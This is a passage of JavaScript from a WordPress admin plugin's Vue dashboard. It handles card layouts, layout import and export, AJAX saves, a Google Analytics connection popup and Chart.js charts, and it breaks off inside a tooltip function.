const uipressOverviewSettings = JSON.parse(uipress_overview_ajax.options);
const uipressOverviewModules = JSON.parse(uipress_overview_ajax.modules);
const uipressOverviewTranslations = JSON.parse(uipress_overview_ajax.translations);

const uipressOverviewArgs = {
  data() {
    return {
      loading: true,
      screenWidth: window.innerWidth,
      settings: uipressOverviewSettings,
      modules: uipressOverviewModules,
      translations: uipressOverviewTranslations,
      uipdata: uipMasterPrefs.dataConnect,
      ui: {
        editingMode: false,
      },
    };
  },
  created: function () {
    window.addEventListener("resize", this.getScreenWidth);
    var self = this;
  },
  computed: {
    originalMenu() {
      var originaltmen = this.master.menuItems;
      return originaltmen;
    },
    updateFromComponent(index, cardData) {
      console.log(index);
      console.log(cardData);
    },
    cardsWithIndex() {
      thecategories = this.settings.cards.formatted;
      newcats = [];

      ///LOOP CATEGORYS
      thecategories.forEach(function (category, i) {
        if (!category.columns) {
          category.columns = [];
        }
        thecolumns = category.columns;
        theCategoryIndex = i;
        tempColumns = [];
        category.id = theCategoryIndex;
        ///LOOP COLUMNS
        thecolumns.forEach(function (column, p) {
          thecards = column.cards;
          theColumnIndex = p;
          column.id = theCategoryIndex + "" + theColumnIndex;

          tempCards = [];

          if (!Array.isArray(thecards)) {
            thecards = [];
          }

          ///LOOP CARDS
          thecards.forEach(function (card, t) {
            theCardIndex = t;
            card.id = theCategoryIndex + "" + theColumnIndex + "" + theCardIndex + "" + card.name;
            tempCards.push(card);
          });

          column.cards = tempCards;
          tempColumns.push(column);
        });
        category.columns = tempColumns;
        newcats.push(category);
      });

      return newcats;
    },
  },
  mounted: function () {
    this.loading = false;
  },
  methods: {
    exportCards() {
      self = this;
      ALLoptions = JSON.stringify(self.settings.cards.formatted);

      var today = new Date();
      var dd = String(today.getDate()).padStart(2, "0");
      var mm = String(today.getMonth() + 1).padStart(2, "0"); //January is 0!
      var yyyy = today.getFullYear();

      date_today = mm + "_" + dd + "_" + yyyy;
      filename = "uipress_dash_" + date_today + ".json";

      var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(ALLoptions);
      var dlAnchorElem = document.getElementById("uip_export_dash");
      dlAnchorElem.setAttribute("href", dataStr);
      dlAnchorElem.setAttribute("download", filename);
      dlAnchorElem.click();
    },
    importCards() {
      self = this;
      allTranslations = self.translations;

      var thefile = jQuery("#uipress_import_cards")[0].files[0];

      if (thefile.type != "application/json") {
        window.alert(allTranslations.validJSON);
        return;
      }

      if (thefile.size > 100000) {
        window.alert(allTranslations.fileBig);
        return;
      }

      var file = document.getElementById("uipress_import_cards").files[0];
      var reader = new FileReader();
      reader.readAsText(file, "UTF-8");

      reader.onload = function (evt) {
        json_settings = evt.target.result;
        parsed = JSON.parse(json_settings);

        if (parsed != null) {
          parsed.id = null;
          ///GOOD TO GO;
          self.settings.cards.formatted = parsed;
          uipNotification(allTranslations.layoutImported, { pos: "bottom-left", status: "success" });
          self.saveDash();
        } else {
          uipNotification(allTranslations.layoutExportedProblem, { pos: "bottom-left", status: "danger" });
        }
      };
    },
    isSmallScreen() {
      if (this.screenWidth < 1000) {
        return true;
      } else {
        return false;
      }
    },
    analyticsAcountConnected() {
      this.settings.analyticsAccount = true;
    },
    logDrop() {
      this.cardsWithIndex;
    },
    removeGoogleAccount() {
      self = this;

      jQuery.ajax({
        url: uipress_overview_ajax.ajax_url,
        type: "post",
        data: {
          action: "uipress_remove_google_account",
          security: uipress_overview_ajax.security,
        },
        success: function (response) {
          data = JSON.parse(response);

          if (data.error) {
            ///SOMETHING WENT WRONG
            uipNotification(data.error, { pos: "bottom-left", status: "danger" });
            return;
          }

          self.settings.analyticsAccount = false;
          uipNotification(data.message, { pos: "bottom-left", status: "primary" });
        },
      });
    },
    resetOverview() {
      self = this;

      if (confirm(self.translations.confirmReset)) {
        self.forceReset();
      }
    },
    forceReset() {
      self = this;

      jQuery.ajax({
        url: uipress_overview_ajax.ajax_url,
        type: "post",
        data: {
          action: "uipress_reset_overview",
          security: uipress_overview_ajax.security,
        },
        success: function (response) {
          data = JSON.parse(response);

          if (data.error) {
            ///SOMETHING WENT WRONG
            uipNotification(data.error, { pos: "bottom-left", status: "danger" });
            return;
          }
          location.reload();
          uipNotification(data.message, { pos: "bottom-left", status: "primary" });
        },
      });
    },
    saveDash() {
      self = this;

      jQuery.ajax({
        url: uipress_overview_ajax.ajax_url,
        type: "post",
        data: {
          action: "uipress_save_dash",
          security: uipress_overview_ajax.security,
          cards: self.settings.cards.formatted,
          network: self.settings.network,
        },
        success: function (response) {
          data = JSON.parse(response);

          if (data.error) {
            ///SOMETHING WENT WRONG
            uipNotification(data.error, { pos: "bottom-left", status: "danger" });
            return;
          }

          uipNotification(data.message, { pos: "bottom-left", status: "primary" });
        },
      });
    },
    getMenus() {
      self = this;

      jQuery.ajax({
        url: uipress_overview_ajax.ajax_url,
        type: "post",
        data: {
          action: "uipress_get_menus",
          security: uipress_overview_ajax.security,
        },
        success: function (response) {
          data = JSON.parse(response);

          if (data.error) {
            ///SOMETHING WENT WRONG
            uipNotification(data.error, { pos: "bottom-left", status: "danger" });
            return;
          }

          self.user.allMenus = data.menus;
        },
      });
    },
    setCardIndex(option, index) {
      option.index = index;
      return index;
    },
    setDragData() {
      return {
        class: "uip-grid uip-card-area",
        //"uk-grid": "masonry: true",
      };
    },
    moveColumnUp(index) {
      arr = this.settings.cards.formatted;
      new_index = index - 1;
      arr.splice(new_index, 0, arr.splice(index, 1)[0]);
    },
    moveColumnDown(index) {
      arr = this.settings.cards.formatted;
      new_index = index + 1;
      arr.splice(new_index, 0, arr.splice(index, 1)[0]);
    },

    addNewColumn(theColumn) {
      theColumn.push({ size: "small", cards: [] });
      uipNotification(this.translations.colAdded, { pos: "bottom-left", status: "primary" });
    },
    newSection() {
      this.settings.cards.formatted.push({ name: "Section name", desc: "Section description", open: true, columns: [] });
      uipNotification(this.translations.sectionAdded, { pos: "bottom-left", status: "primary" });
    },
    deleteSection(index) {
      this.settings.cards.formatted.splice(index, 1);
    },
    removeCard(theParent, index) {
      theParent.cards.splice(index, 1);
    },
    removeCol(theParent, index) {
      theParent.splice(index, 1);
    },
    getdatafromComp(data) {
      return data;
    },
  },
};

const uipressOverviewApp = Vue.createApp(uipressOverviewArgs);

uipressOverviewApp.component("date-range-picker", {
  props: {
    dates: Object,
  },
  data: function () {
    return {
      thepicker: "",
      date: {
        startDate: this.dates.startDate,
        endDate: this.dates.endDate,
      },
    };
  },
  mounted: function () {
    let datepicker = this;

    const picker = new Litepicker({
      element: document.getElementById("uip-date-range"),
      singleMode: false,
      plugins: ["ranges"],
      numberOfColumns: 2,
      numberOfMonths: 2,
      startDate: datepicker.date.startDate,
      endDate: datepicker.date.endDate,
      format: "DD MMM, YYYY",
      maxDate: moment().format("DD MMM, YYYY"),
    });

    this.thepicker = picker;

    picker.on("selected", (date1, date2) => {
      // some action
      thedates = {
        startDate: picker.getStartDate().format("YYYY-MM-DD"),
        endDate: picker.getEndDate().format("YYYY-MM-DD"),
      };
      datepicker.returnNewDates(thedates);
    });
  },

  methods: {
    returnNewDates(dateObj) {
      this.$emit("date-change", dateObj);
    },
    showPicker() {
      this.thepicker.show();
    },
  },
  template:
    '<div class="uip-flex uip-flex-center uip-border-round uip-background-muted hover:uip-background-grey uip-cursor-pointer uip-padding-xs">\
      <span @click="showPicker()" class="material-icons-outlined uip-margin-right-xxs uip-text-muted">date_range</span>\
      <input  class="uip-blank-input uip-no-text-select  uip-cursor-pointer uip-w-190" type="text" id="uip-date-range" readonly>\
      <span @click="showPicker()" class="material-icons-outlined uip-margin-left-xxs uip-text-muted">expand_more</span>\
    </div>',
});
uipressOverviewApp.component("loading-placeholder", {
  data: function () {
    return {};
  },
  methods: {
    doStuff() {},
  },
  template:
    '<svg class="uip-w-100p" role="img" width="340" height="84" aria-labelledby="loading-aria" viewBox="0 0 340 84" preserveAspectRatio="none">\
    <title id="loading-aria">Loading...</title>\
    <rect x="0" y="0" width="100%" height="100%" clip-path="url(#clip-path)" style=\'fill: url("#fill");\'></rect>\
    <defs>\
      <clipPath id="clip-path">\
        <rect x="0" y="0" rx="3" ry="3" width="67" height="11" />\
        <rect x="76" y="0" rx="3" ry="3" width="140" height="11" />\
        <rect x="127" y="48" rx="3" ry="3" width="53" height="11" />\
        <rect x="187" y="48" rx="3" ry="3" width="72" height="11" />\
        <rect x="18" y="48" rx="3" ry="3" width="100" height="11" />\
        <rect x="0" y="71" rx="3" ry="3" width="37" height="11" />\
        <rect x="18" y="23" rx="3" ry="3" width="140" height="11" />\
        <rect x="166" y="23" rx="3" ry="3" width="173" height="11" />\
      </clipPath>\
      <linearGradient id="fill">\
        <stop offset="0.599964" stop-color="rgba(156, 155, 155, 13%)" stop-opacity="1">\
          <animate attributeName="offset" values="-2; -2; 1" keyTimes="0; 0.25; 1" dur="2s" repeatCount="indefinite"></animate>\
        </stop>\
        <stop offset="1.59996" stop-color="rgba(156, 155, 155, 20%)" stop-opacity="1">\
          <animate attributeName="offset" values="-1; -1; 2" keyTimes="0; 0.25; 1" dur="2s" repeatCount="indefinite"></animate>\
        </stop>\
        <stop offset="2.59996" stop-color="rgba(156, 155, 155, 13%)" stop-opacity="1">\
          <animate attributeName="offset" values="0; 0; 3" keyTimes="0; 0.25; 1" dur="2s" repeatCount="indefinite"></animate>\
        </stop>\
      </linearGradient>\
    </defs>\
  </svg>',
});

uipressOverviewApp.component("connect-google-analytics", {
  emits: ["account-connected"],
  props: {
    translations: Object,
  },
  data: function () {
    return {
      imgloading: false,
      googliconNoHover: "",
      googliconHover: "",
    };
  },
  mounted: function () {
    this.startBuild;
  },
  computed: {
    returnHoverImg() {
      return this.googliconHover;
    },
    returnNoHoverImg() {
      return this.googliconNoHover;
    },
    isLoading() {
      return this.imgloading;
    },
    startBuild() {
      this.getImages();
    },
  },
  methods: {
    gauthWindow() {
      let self = this;
      var url =
        "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=583702447211-6qiibg31fdkiug7r41qobqi1c1js1jps.apps.googleusercontent.com&redirect_uri=https://admintwentytwenty.com/analytics/view.php&scope=https://www.googleapis.com/auth/analytics.readonly&access_type=offline&approval_prompt=force";
      var newWindow = window.open(url, "name", "height=600,width=450");

      if (window.focus) {
        newWindow.focus();
      }

      window.onmessage = function (e) {
        if (e.origin == "https://admintwentytwenty.com" && e.data) {
          try {
            var analyticsdata = JSON.parse(e.data);

            if (analyticsdata.code && analyticsdata.view) {
              newWindow.close();
              self.uip_save_analytics(analyticsdata.view, analyticsdata.code);
            }
          } catch (err) {
            ///ERROR
          }
        }
      };
    },
    uip_save_analytics(view, code) {
      let self = this;
      jQuery.ajax({
        url: uipress_overview_ajax.ajax_url,
        type: "post",
        data: {
          action: "uipress_save_analytics_account",
          security: uipress_overview_ajax.security,
          view: view,
          code: code,
        },
        success: function (response) {
          data = JSON.parse(response);

          if (data.error) {
            ///SOMETHING WENT WRONG
            uipNotification(data.error, { pos: "bottom-left", status: "danger" });
            self.loading = false;
            return;
          }

          self.$root.analyticsAcountConnected();
          //this.$root.$emit("account-connected");
          uipNotification(data.message, { pos: "bottom-left", status: "success" });
          self.loading = false;
        },
      });
    },
    getImages() {
      let self = this;
      self.loading = true;

      jQuery.ajax({
        url: uipress_overview_ajax.ajax_url,
        type: "post",
        data: {
          action: "uipress_get_google_images",
          security: uipress_overview_ajax.security,
        },
        success: function (response) {
          data = JSON.parse(response);

          if (data.error) {
            ///SOMETHING WENT WRONG
            uipNotification(data.error, { pos: "bottom-left", status: "danger" });
            self.loading = false;
            return;
          }

          self.loading = false;

          self.googliconNoHover = data.googliconNoHover;
          self.googliconHover = data.googliconHover;
        },
      });
    },
  },
  template:
    '<p>{{translations.noaccount}}</p>\
    <loading-placeholder v-if="isLoading == true"></loading-placeholder>\
    <a v-if="!isLoading" class="uip-google-sign-in" href="#" @click="gauthWindow()">\
        <img class="uip-icon-no-hover" width="191" :src="returnNoHoverImg">\
        <img class="uip-icon-hover" width="191" :src="returnHoverImg">\
    </a>',
});

uipressOverviewApp.component("card-options", {
  emits: ["remove-card", "card-change"],
  props: {
    translations: Object,
    card: Object,
    cardindex: Number,
  },
  data: function () {
    return {
      theCard: this.card,
      theIndex: this.cardindex,
      theID: this.card.id,
      theCardName: this.card.name,
    };
  },
  computed: {
    returnIndex() {
      return this.theIndex;
    },
    returnCard() {
      let self = this;
      return self.theCard;
    },
  },
  mounted: function () {
    datepicker = this;
  },
  methods: {
    removeCard() {
      this.$emit("remove-card");
    },
  },
  watch: {
    theCard: function (newValue, oldValue) {
      let self = this;
      this.$emit("card-change", self.returnCard);
    },
  },
  template:
    '<ul class="">\
        <li>\
          <div class="uip-text-bold uip-margin-bottom-xs">{{translations.cardWidth}}</div>\
          <select class="uk-select uk-form-small uk-margin-small uip-margin-bottom-s" v-model="returnCard.size">\
              <option value="xxsmall">{{translations.xxsmall}}</option>\
              <option value="xsmall">{{translations.xsmall}}</option>\
              <option value="small">{{translations.small}}</option>\
              <option value="small-medium">{{translations.smallmedium}}</option>\
              <option value="medium">{{translations.medium}}</option>\
              <option value="medium-large">{{translations.mediumlarge}}</option>\
              <option value="large">{{translations.large}}</option>\
              <option value="xlarge">{{translations.xlarge}}</option>\
          </select>\
        </li>\
        <li class="uip-margin-bottom-s">\
            <div class="uip-text-bold uip-margin-bottom-xs">{{translations.bgcolor}}</div>\
            <div class="uip-margin-bottom-xm uip-padding-xxs uip-border uip-border-round uip-w-200 uip-background-default uip-border-box">\
            <div class="uip-flex uip-flex-center">\
              <span class="uip-margin-right-xs uip-text-muted">\
                  <label class="uip-border-circle uip-h-18 uip-w-18 uip-border uip-display-block" v-bind:style="{\'background-color\' : returnCard.bgColor}">\
                    <input\
                    type="color"\
                    v-model="returnCard.bgColor" style="visibility: hidden;">\
                  </label>\
              </span> \
              <input v-model="returnCard.bgColor" type="search" :placeholder="translations.colorPlace" class="uip-blank-input uip-margin-right-s " style="min-width:0;">\
              <span class="uip-text-muted">\
                  <span class="material-icons-outlined uip-text-muted">color_lens</span>\
              </span> \
            </div>\
          </div>\
        </li>\
        <li class="uip-margin-bottom-s">\
          <div class="uip-text-bold uip-margin-bottom-xs">{{translations.lightText}}</div>\
          <label class="uip-switch">\
            <input type="checkbox" v-model="returnCard.lightDark">\
            <span class="uip-slider"></span>\
          </label>\
        </li>\
        <li class="uip-margin-bottom-m">\
          <div class="uip-text-bold uip-margin-bottom-xs">{{translations.removeBackground}}</div>\
          <label class="uip-switch">\
            <input type="checkbox" v-model="returnCard.nobg">\
            <span class="uip-slider"></span>\
          </label>\
        </li>\
        <li><button @click="removeCard()" class="uip-button-danger uip-w-100p">{{translations.remove}}</button></li>\
    </ul>',
});

const highlight = (editor) => {
  editor.textContent = editor.textContent;
  hljs.highlightBlock(editor);
};

let editorOptions = {
  tab: " ".repeat(2), // default is \t
};

uipressOverviewApp.component("code-flask", {
  data: function () {
    return {
      created: false,
      unformatted: this.usercode,
    };
  },
  props: {
    language: String,
    usercode: String,
  },
  computed: {
    returnCode() {
      return this.unformatted;
    },
  },
  mounted: function () {
    this.testel();
  },
  methods: {
    codeChange(thecode) {
      this.$emit("code-change", thecode);
      //self.usercode = code;
    },
    //////TITLE: ADDS A SLECTED OPTION//////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////DESCRIPTION: ADDS A SELECTED OPTION FROM OPTIONS
    testel() {
      self = this;
      const editor = this.$el;
      const jar = new CodeJar(editor, highlight, editorOptions);

      jar.onUpdate((code) => {
        this.codeChange(code);
      });
    },
  },
  template: '<div class="editor " :class="language"  data-gramm="false">{{returnCode}}</div> ',
});

uipressOverviewApp.component("premium-overlay", {
  props: {
    translations: Object,
  },
  data: function () {
    return {};
  },
  methods: {},
  template:
    '<div style="top: -42px !important;\
  left: 0 !important;\
  position: absolute;\
  right: 0 !important;\
  bottom: 0 !important;\
  background-color:#f0f8ff33;\
  display: block !important;\
  backdrop-filter: blur(4px) !important;\
  opacity: 1 !important;\
  z-index: 9;\
  visibility: visible !important;" >\
    <div class="uip-flex uip-flex-center uip-flex-middle uip-h-100p">\
      <div class="uip-flex uip-flex-middle uip-flex-column">\
            <div class="uip-text-center uip-text-emphasis uip-text-l uip-text-bold uip-margin-bottom-xs">\
              {{translations.upgradMsg}}\
            </div>\
            <a href="https://uipress.co/pricing" target="_BLANK"  class="uip-button-primary uip-flex uip-no-underline uip-margin-auto">\
              <span class="material-icons-outlined uip-margin-right-xs" >redeem</span>\
              {{translations.premium}}\
            </a>\
      </div>\
    </div>\
  </div>',
});

uipressOverviewApp.component("col-editer", {
  props: {
    translations: Object,
    column: Object,
    modules: Object,
    premium: Boolean,
  },
  data: function () {
    return {
      theColumn: this.column,
    };
  },
  mounted: function () {},
  methods: {
    removeCol() {
      this.$emit("remove-col");
    },
    getdatafromComp(column) {
      this.$emit("col-change", column);
    },
    columnUpdated(column) {
      this.$emit("col-change", column);
    },
  },
  watch: {
    theCard: function (newValue, oldValue) {
      tempCard = this.theColumn;
      this.$emit("col-change", tempCard);
    },
  },
  template:
    '<div class="uip-margin-bottom-s">\
      <div class="uip-background-default uip-padding-s uip-border-dashed uip-border-round" >\
      <div class="uip-text-bold uip-margin-bottom-xs">{{translations.columnSettings}}</div>\
        <div class="uip-flex">\
          <div class="uip-flex-grow">\
            <select class="" v-model="theColumn.size" style="height:100%;">\
                <option value="xxsmall">{{translations.xxsmall}}</option>\
                <option value="xsmall">{{translations.xsmall}}</option>\
                <option value="small">{{translations.small}}</option>\
                <option value="small-medium">{{translations.smallmedium}}</option>\
                <option value="medium">{{translations.medium}}</option>\
                <option value="medium-large">{{translations.mediumlarge}}</option>\
                <option value="large">{{translations.large}}</option>\
                <option value="xlarge">{{translations.xlarge}}</option>\
            </select>\
          </div>\
          <div class="uip-position-relative uip-margin-left-xs">\
            <uip-dropdown type="icon" icon="add" pos="botton-center">\
              <card-selector :premium="premium" @card-added="columnUpdated($event)" :theColumn="theColumn" :translations="translations" :modules="modules"></card-selector>\
            </uip-dropdown>\
          </div>\
          <button @click="removeCol()" class="uip-button-danger uip-margin-left-xs material-icons-outlined">delete</button>\
        </div>\
      </div>\
    </div>',
});

uipressOverviewApp.component("card-selector", {
  props: {
    translations: Object,
    theColumn: Object,
    modules: Object,
    premium: Boolean,
  },
  data: function () {
    return {
      theCol: this.theColumn,
      searchString: "",
    };
  },
  mounted: function () {
    datepicker = this;
  },
  methods: {
    addCard(card) {
      let self = this;

      if (!self.theCol.cards) {
        self.theCol.cards = [];
      }
      self.theCol.cards.push({ name: card.name, compName: card.moduleName, size: "xlarge" });
      this.$emit("card-added", self.theCol);
      uipNotification(self.translations.cardAdded, { pos: "bottom-left", status: "primary" });
      //this.$emit("remove-col");
    },
    isInSearch(currentModule, search) {
      thename = currentModule.name.toLowerCase();
      desc = currentModule.description.toLowerCase();
      cat = currentModule.category.toLowerCase();
      searchlc = search.toLowerCase();

      if (thename.includes(searchlc) || desc.includes(searchlc) || cat.includes(searchlc)) {
        return true;
      }

      return false;
    },
  },
  template:
    '<div class="">\
        <div class="uip-text-bold uip-text-emphasis uip-text-l uip-margin-bottom-s">{{translations.availableCards}}</div>\
        <input class="uip-margin-bottom-s uip-w-200" type="search" v-model="searchString" :placeholder="translations.searchCards">\
        <div class="uip-grid uip-grid-small uip-w-500 uip-max-h-500 uip-overflow-auto uip-inline-flex uip-flex-wrap uip-flex-row ">\
        <template v-for="module in modules" >\
          <div v-if="isInSearch(module, searchString)" class="uip-width-medium">\
            <div class="uk-border-round uip-background-muted uip-padding-s uip-margin-bottom-s">\
              <div class="uip-text-bold uip-text-emphasis uip-margin-bottom-s">{{module.name}}</div>\
              <div class="uip-margin-bottom-s">\
                <span class="uip-background-primary-wash uip-border-round uip-padding-xxs uip-text-bold">{{module.category}}</span>\
              </div>\
              <div class="uip-text-muted uip-margin-bottom-s">{{module.description}}</div>\
              <button @click="addCard(module)" v-if="module.premium && premium == true" class="uip-button-secondary">{{translations.addCard}}</button>\
              <button @click="addCard(module)" v-if="!module.premium" class="uip-button-secondary">{{translations.addCard}}</button>\
              <a href="https://uipress.co/pricing" target="_BLANK" v-if="module.premium && premium == false" class="uk-button uk-button-small uk-button-danger uk-flex uk-flex-middle uk-flex-center">\
                <span class="material-icons-outlined uk-margin-small-right" style="font-size:20px;">redeem</span>\
                {{translations.premium}}\
              </a>\
            </div>\
          </div>\
          </template>\
        </div>\
    </div>',
});

uipressOverviewApp.component("uip-dropdown", {
  props: {
    type: String,
    icon: String,
    pos: String,
    translation: String,
  },
  data: function () {
    return {
      modelOpen: false,
    };
  },
  mounted: function () {},
  methods: {
    onClickOutside(event) {
      const path = event.path || (event.composedPath ? event.composedPath() : undefined);
      // check if the MouseClick occurs inside the component
      if (path && !path.includes(this.$el) && !this.$el.contains(event.target)) {
        this.closeThisComponent(); // whatever method which close your component
      }
    },
    openThisComponent() {
      this.modelOpen = this.modelOpen != true; // whatever codes which open your component
      // You can also use Vue.$nextTick or setTimeout
      requestAnimationFrame(() => {
        document.documentElement.addEventListener("click", this.onClickOutside, false);
      });
    },
    closeThisComponent() {
      this.modelOpen = false; // whatever codes which close your component
      document.documentElement.removeEventListener("click", this.onClickOutside, false);
    },
    getClass() {
      if (this.pos == "botton-left") {
        return "uip-margin-top-s uip-right-0";
      }
      if (this.pos == "botton-center") {
        return "uip-margin-top-s uip-right-center";
      }
    },
  },
  template:
    '<div class="uip-position-relative">\
      <div class="">\
        <div v-if="type == \'icon\'" @click="openThisComponent" class="uip-background-muted uip-border-round hover:uip-background-grey uip-cursor-pointer uip-padding-xs material-icons-outlined" type="button">{{icon}}</div>\
        <button v-if="type == \'button\'" @click="openThisComponent" class="uip-button-default material-icons-outlined" type="button">{{translation}}</button>\
      </div>\
      <div v-if="modelOpen" :class="getClass()"\
      class="uip-position-absolute uip-padding-s uip-background-default uip-border-round uip-shadow uip-min-w-250 uip-z-index-9999">\
        <slot></slot>\
      </div>\
    </div>',
});

uipressOverviewApp.component("uip-chart", {
  props: {
    type: String,
    gridLines: Boolean,
    chartData: Object,
    dates: Object,
    colours: {
      bgColors: [],
      borderColors: [],
    },
    cWidth: String,
    borderWidth: Number,
    cutout: String,
    spacing: Number,
    borderradius: Number,
    removeLabels: Boolean,
  },
  data: function () {
    return {
      theCard: this.card,
      theDates: this.dates,
      defaultColors: {
        bgColors: ["rgba(255, 99, 132, 0.2)", "rgba(54, 162, 235, 0.2)", "rgba(255, 206, 86, 0.2)", "rgba(75, 192, 192, 0.2)", "rgba(153, 102, 255, 0.2)", "rgba(255, 159, 64, 0.2)"],
        borderColors: ["rgba(255, 99, 132, 1)", "rgba(54, 162, 235, 1)", "rgba(255, 206, 86, 1)", "rgba(75, 192, 192, 1)", "rgba(153, 102, 255, 1)", "rgba(255, 159, 64, 1)"],
      },
    };
  },
  mounted: function () {
    theChart = this;
    this.renderChart();
  },
  computed: {
    bgColors() {
      if (this.backgroundColors) {
        return this.backgroundColors;
      } else {
        return this.defaultColors;
      }
    },
    chartWidth() {
      if (this.cWidth) {
        return this.cWidth;
      } else {
        return "100%";
      }
    },
    displayLabels() {
      if (this.removeLabels == true) {
        return false;
      } else {
        return true;
      }
    },
  },
  methods: {
    getTooltip(context) {
      // Tooltip Element
      var tooltipEl = document.getElementById("chartjs-tooltip");

      // Create element on first render
      if (!tooltipEl) {
        tooltipEl = document.createElement("div");
        tooltipEl.id = "chartjs-tooltip";
        tooltipEl.innerHTML = "<div class='uip-background-default uip-boder uip-padding-s uip-shadow uip-border-round'></div>";
        document.body.appendChild(tooltipEl);
      }

      // Hide if no tooltip
      var tooltipModel = context.tooltip;
      if (tooltipModel.opacity === 0) {
        tooltipEl.style.opacity = 0;
        return;
      }

      // Set caret Position
      tooltipEl.classList.remove("above", "below", "no-transform");
      if (tooltipModel.yAlign) {
        tooltipEl.classList.add(tooltipModel.yAlign);
      } else {
        tooltipEl.classList.add("no-transform");
      }

      function getBody(bodyItem) {
        return bodyItem.lines;
      }

      // Set Text
      if (tooltipModel.body) {
        var titleLines = tooltipModel.title || [];
        var bodyLines = tooltipModel.body.map(getBody);

        var innerHtml = "";

        titleLines.forEach(function (title) {
          innerHtml += "<div class='uip-text-bold uip-margin-bottom-xs'>" + title + "</div>";
        });

        bodyData = tooltipModel.dataPoints;

        bodyData.forEach(function (body, i) {
          datasetLabel = body.label;
          datasetValue = body.formattedValue;

          innerHtml += '<div class="uip-margin-bottom-xs">';
          var colors = tooltipModel.labelColors[i];
          var style = "background:" + colors.backgroundColor;
          style += "; border: 2px solid " + colors.borderColor;
          style += "; border-radius: 50%";
          style += "; width: 7px";
          style += "; height: 7px";
          style += "; display: inline-block";
          style += "; margin-right: 5px";
          innerHtml += '<span style="' + style + '"></span>';

          textStyle = "color: " + colors.borderColor + ";margin-right:5px;";
          innerHtml += '<span class="uip-text-m uip-text-muted" style="' + textStyle + '">' + datasetValue + "</span>";
          innerHtml += '<span class="uip-text-m uip-text-muted">' + body.dataset.label + "</span>";
          innerHtml += "</div>";
        });
        innerHtml += "";

        var tableRoot = tooltipEl.querySelector("div");
        tableRoot.innerHTML = innerHtml;
      }

      var position = context.chart.canvas.getBoundingClientRect();
      var bodyFont = Chart.helpers.toFont(tooltipModel.options.bodyFont);

      // Display, position, and set styles for font
      tooltipEl.style.opacity = 1;
      tooltipEl.style.position = "absolute";
      tooltipEl.style.left = position.left + window.pageXOffset + tooltipModel.caretX + "px";
      tooltipEl.style.top = position.top + window.pageYOffset + tooltipModel.caretY + "px";
      tooltipEl.style.font = bodyFont.string;
      tooltipEl.style.padding = tooltipModel.padding + "px " + tooltipModel.padding + "px";
      tooltipEl.style.pointerEvents = "none";
    },
    getOptions() {
      let self = this;
      let chartOptions = [];

      if (this.type == "doughnut") {
        options = {
          borderWidth: 0,
          cutout: "80%",
          spacing: 0,
          borderRadius: 0,
          layout: {
            padding: 0,
          },
          plugins: {
            legend: {
              display: self.displayLabels,
              position: "bottom",
              align: "left",
              labels: {
                padding: 10,
                usePointStyle: true,
              },
            },
            tooltip: {
              enabled: false,
              external: function (context) {
                self.getTooltip(context);
              },
            },
          },
          scales: {
            x: {
              ticks: {
                display: theChart.gridLines,
              },
              grid: {
                borderWidth: 0,
                display: theChart.gridLines,
              },
            },
            y: {
              beginAtZero: true,
              ticks: {
                display: theChart.gridLines,
              },
              grid: {
                borderWidth: 0,
                display: theChart.gridLines,
                border: theChart.gridLines,
              },
            },
          },
        };

        chartOptions = options;
      } else {
        options = {
          cutout: "0%",
          spacing: 0,
          borderRadius: 0,
          tension: 0.1,
          pointRadius: 0,
          pointHoverRadius: 5,
          borderRadius: 4,
          interaction: {
            mode: "nearest",
          },
          hover: {
            intersect: false,
          },
          borderSkipped: false,
          plugins: {
            legend: {
              display: self.displayLabels,
              position: "bottom",
              align: "start",
              padding: 10,
              labels: {
                padding: 10,
                usePointStyle: true,
                pointStyle: "rectRounded",
              },
              title: {
                padding: 0,
                display: true,
              },
            },
            tooltip: {
              position: "average",
              backgroundColor: "#fff",
              padding: 20,
              bodySpacing: 10,
              bodyFont: {
                size: 12,
              },
              titleFont: {
                size: 14,
                weight: "bold",
              },
              mode: "index",
              intersect: false,
              xAlign: "left",
              yAlign: "center",
              caretPadding: 10,
              cornerRadius: 4,
              borderColor: "rgba(162, 162, 162, 0.2)",
              borderWidth: 1,
              titleColor: "#333",
              bodyColor: "#777",
              titleMarginBottom: 10,
              bodyFontSize: 100,
              usePointStyle: true,

              enabled: false,

              external: function (context) {
                self.getTooltip(context);
              },
            },
          },
          scales: {
            x: {
              ticks: {
                display: false,
              },
              grid: {
                borderWidth: 1,
                display: true,
                borderDash: [10, 8],
                color: "rgba(162, 162, 162, 0.4)",
              },
            },
            y: {
              beginAtZero: true,
              ticks: {
                display: false,
              },
              grid: {
                borderWidth: 0,
                display: false,
              },
            },
          },
        };

        chartOptions = options;
      }

      if (self.type == "horizontalbar") {
        chartOptions.indexAxis = "y";
      }

      return chartOptions;
    },
    renderChart() {
      let theChart = this;
      let temptype = theChart.type;

      if (theChart.type == "horizontalbar") {
        theChart.chartData.datasets;
        temptype = "bar";
        let newdata = [];

        theChart.chartData.datasets.forEach(function (body, i) {
          body.axis = "y";
          newdata.push(body);
        });

        theChart.chartData.datasets = newdata;
      }

      var ctx = this.$el.getContext("2d");
      var myChart = new Chart(ctx, {
        type: temptype,
        data: theChart.chartData,
        options: theChart.getOptions(),
      });
    },
  },
  template: '<canvas :width="chartWidth" height="200" :dat-sd="dates.startDate" :dat-sed="dates.endDate" style="max-width:100% !important;"></canvas>',
});

uipressOverviewApp.component("uip-country-chart", {
  props: {
    type: String,
    cdata: Object,
    dates: Object,
    translations: Object,
  },
  data: function () {
    return {
      theCard: this.card,
      theDates: this.dates,
    };
  },
  mounted: function () {
    theChart = this;
    this.renderChart();
  },
  methods: {
    getTooltip(context) {
      // Tooltip Element
      var tooltipEl = document.getElementById("chartjs-tooltip");

      // Create element on first render
      if (!tooltipEl) {
        tooltipEl = document.createElement("div");
        tooltipEl.id = "chartjs-tooltip";
        tooltipEl.innerHTML = "<div class='uip-background-default uip-boder uip-padding-s uip-shadow uip-border-round'></div>";
        document.body.appendChild(tooltipEl);
      }

      // Hide if no tooltip
      var tooltipModel = context.tooltip;
      if (tooltipModel.opacity === 0) {
        tooltipEl.style.opacity = 0;
        return;
      }

      // Set caret Position
      tooltipEl.classList.remove("above", "below", "no-transform");
      if (tooltipModel.yAlign) {
        tooltipEl.classList.add(tooltipModel.yAlign);
      } else {
        tooltipEl.classList.add("no-transform");
      }

      function getBody(bodyItem) {
        return bodyItem.lines;
      }

      // Set Text
      if (tooltipModel.body) {
        var titleLines = tooltipModel.title || [];
